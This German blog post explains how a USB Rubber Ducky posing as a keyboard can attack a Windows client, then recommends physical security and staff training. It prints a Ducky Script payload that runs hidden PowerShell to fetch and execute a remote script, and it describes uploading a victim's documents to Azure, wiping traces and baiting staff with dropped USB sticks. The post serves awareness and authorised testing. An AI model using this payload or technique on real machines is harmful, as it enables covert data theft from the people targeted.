---
layout: post
title: "Angriffsvektor HID"
date: 2022-08-10 02:00:00 +0200
categories: IT-security
---
# Einführung

In Zeiten von Firewall und Anti-Malware Software ist es für Angreifer um einiges
schwerer geworden, Daten von Computersystemen zu stehlen. In der Regel ist es zu
aufwändig, in ein System einzubrechen. Daher gehen ja auch immer wieder Phishing
Mails rum, die Zugangsdaten stehlen wollen, am besten für Clouds wie
Microsoft 365. Wenn man die hat, scheren einen die Sicherheitssysteme auf dem
Client ja nicht mehr. Natürlich gibt es dafür effektive Gegenmaßnahmen wie
Multi-Factor-Authentication mit Azure AD. Auch sollte man seine Mitarbeiter
gegen Phishing sensibilisieren und auch Testangriffe fahren. Dafür gibt es auch
in MS 365 eine Möglichkeit, nämlich die Attack Simulation.

Hier möchte ich einen weiteren Weg vorstellen, wie man einen Client direkt
angreifen kann. Direkt vorweg gesagt, die Methode ist alles andere als neu und
man braucht physischen Zugriff auf das Gerät. Trivial ist sie also auch nicht.

## USB-Speicher

Da sich die IT Admins durchaus bewusst sind, dass man mit USB Speicher sehr
leicht Daten stehlen kann, gibt es Möglichkeiten USB Speicher einzugrenzen. So
kann man z. B. client-seitig USB-Sticks per Software verhindern. Was aber dabei
nicht eingeschränkt wird sind Tastaturen. Die Mitarbeiter sollen ja ergonomisch
arbeiten können. Das bedeutet dann, dass das Notebook erhöht vor einem steht und
sich eine externe Tastatur direkt vor einem befindet.

Jetzt ratet mal, wie die Tastatur angeschlossen ist. Hat wer USB gesagt?
Hundert Gummipunkte.

Natürlich möchte man eine USB Tastatur nicht verhindern, schließlich sollte
Security die Mitarbeiter nicht allzu sehr einschränken. Und das meine ich
wirklich so. Schränken Sicherheitsmaßnahmen zu sehr ein, werden sie nicht
akzeptiert und man findet Wege diese zu umgehen.

## HID und Rubber Ducky

Genug Vorgeplänkel, wie kann man das jetzt für einen Angriff ausnutzen? Die
Tastatur ist ein sogenanntes HID, also Human Interface Device. Es wäre doch
sehr einfach, über diese ein Script auf dem Gerät zu schreiben, dass dann tolle
Sachen macht. Also toll für den Angreifer. Das dauert aber zu lange. Und ehrlich
gesagt kann man dann auch gleich die Seite eines Cloud Speichers öffnen und die
Daten manuell hochladen. Der Angriff muss schneller gehen, so viele Zeit hat man
in der Regel nicht als Angreifer.

Jetzt kommt der Rubber Ducky in's Spiel. Das ist ein kleiner USB-Stick, der
sich aber als HID ausgibt. Er wird also vom System nicht abgewehrt und direkt
aktiviert. Wir haben jetzt also eine Tastatur. Toll. Der Clou ist jetzt, dass
der Angreifer dem Rubber Ducky vorher einprogrammieren kann, was er tun soll.
Und das kann er mit sehr vielen Tastenanschlägen pro Minute.
Schneller als es ein Mensch je können wird.

## Der Angriff

Die Idee ist nun folgende. Wir führen einen kurzen PowerShell Befehl aus, der in
Sekunden ein PowerShell Skript aus der Cloud nachlädt. Einfach über
Start – Ausführen. In der Sprache für den Rubber Ducky (Ducky Script)
sieht das dann so aus:
```
RUN WIN "
powershell -WindowStyle Hidden -Exec Bypass \
"invoke-webrequest https://xyz.blob.core.windows.net/download/s.ps1
-outfile \$env:TEMP\\s.ps1;
While (\$true) {
If ((Test-Path \$env:TEMP\\s.ps1)) { 
& \"\$env:TEMP\\s.ps1 
$EJECT_TIME\"\";
break } }\""
```
Das Script (s.ps1) wird also auch direkt ausgeführt. Ich habe mir mal ein
Script geschrieben, dass einfach alle Dateien in den Ordnern
MyDocuments, Desktop, OneDrive und OneDriveCommercial
sucht und zu Azure hochlädt. Damit es möglichst schnell geht, habe ich die Suche
auf bestimmte Dateitypen eingeschränkt (*.doc*;*.xls*;ppt*;*.msg) und auf
Dateien die in den letzten 30 Tagen erstellt wurden. Die Dateien werden dann
einfach in einen Azure Blob Storage hochgeladen. Theoretisch würde es mir also
auch reichen, wenn nicht ich, sondern der Mitarbeiter selbst den USB-Stick
einsteckt. Vielleicht einfach mal auf dem Parkplatz ein paar liegen lassen und
mit “Kündigungen 2022” beschriften? Natürlich wird er merken, dass etwas nicht
richtig ist, aber dann sind die Daten schon hochgeladen.

Abschließend verwische ich noch meine Spuren auf dem Client, indem ich die
Historie von Start – Ausführen aus der Registry lösche und auch das
heruntergeladene Script. Natürlich hinterlässt man trotzdem Spuren im Netzwerk.
So könnte ein Intrusion Prevention System vielleicht anspringen. Aber das müsste
schon sehr scharf eingestellt sein. Ein paar dutzend Dateien in einen Azure Blob
Storage hochladen ist jetzt auch nicht so auffällig. Trotzdem könnte man mich
als Angreifer evtl. über die Azure Blob Storage Adresse identifizieren. Man
müsste also vielleicht einen anonymen Cloud Speicherdienst verwenden. Aber hier
geht es ja auch nicht um einen echten Angriff, sonder um die Machbarkeit und die 
Sensibilisierung. White Hacking und so. Da ist es mir egal, wenn man mich
hinterher identifizieren kann, so etwas würde ich eh nicht ohne Auftrag machen.

## Den Angriff verhindern

Wie kann man also so einen Angriff verhindern? Wie bereits oben erwähnt,
benötigt es zwei Dinge:

1. Der Computer darf HID nicht blocken
2. Physischen Zugriff auf das Gerät

Aus den oben genannten Gründen würde ich HID nicht blocken. Das ist einfach
nicht praktikabel. Den physischen Zugriff auf ein Gerät sollte ein Angreifer
aber auf keinen Fall bekommen können. Das lässt sich verhindern. Natürlich muss
man mit der Unbedarftheit seiner Mitarbeiter rechnen. Mit Social Engineering und 
Hacking lässt sich eine Menge machen. Und ist man erst einmal am Gerät, reichen
30 Sekunden aus. Dasselbe gilt für den auf dem Parkplatz gefundenen Gerät. Hier
ist die beste Abwehrmaßnahme also Schulung der Mitarbeiter und auch
Angriffstests.

## Abschluss

Ich hoffe euch gezeigt zu haben, dass man Angriffe nicht immer mit technischen
Mitteln abwehren kann. Die tollsten Systeme bringen einem nichts, wenn es an
Grundlagen wie der physischen Sicherheit oder Sicherheitsschulungen fehlt.
Ein Sicherheitskonzept muss immer ganzheitlich betrachtet werden, sonst werden
viele Angriffsvektoren offengelassen.
